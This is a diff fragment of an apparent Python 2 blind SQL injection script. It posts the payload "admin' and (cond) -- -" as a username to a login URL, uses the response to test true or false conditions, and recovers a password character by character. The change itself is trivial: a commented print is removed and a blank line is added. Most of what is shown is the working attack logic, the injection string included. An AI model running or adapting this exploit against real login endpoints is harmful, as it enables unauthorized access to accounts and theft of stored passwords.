@@ -21,7 +21,6 @@ def evaluateCondition(cond):
     payload = "admin' and (%s) -- -" % cond
     response = postURL(BASEURL, {"username": payload})
 
-    #print response
     return TRUE in response
 
 
@@ -42,5 +41,6 @@ def exploitSQL():
             if i == alphabet[-1]:
                 passthrough = True
     return password
+
 
 print exploitSQL()
